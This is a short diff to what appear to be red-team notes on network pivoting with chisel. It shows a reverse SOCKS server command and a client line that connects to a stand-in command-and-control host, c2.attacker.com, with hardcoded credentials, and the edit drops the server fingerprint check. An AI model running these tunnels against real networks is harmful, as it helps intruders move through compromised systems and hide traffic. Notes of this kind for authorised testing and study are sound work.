@@ -26,7 +26,7 @@ chisel server --port 80 --socks5 --reverse --authfile ./users.json
 Connect with the client from Linux to establish a reverse [[notes/pivoting/socks-proxy]].
 
 ~~~ bash
-./chisel client --fingerprint $fingerprint --auth proxy:'passw0rd' http://c2.attacker.com R:127.0.0.1:1080:socks
+./chisel client --auth proxy:'passw0rd' http://c2.attacker.com R:127.0.0.1:1080:socks
 ~~~
 
 Connect with the client from Windows to forward local port 53/udp to port 5300 on the server.
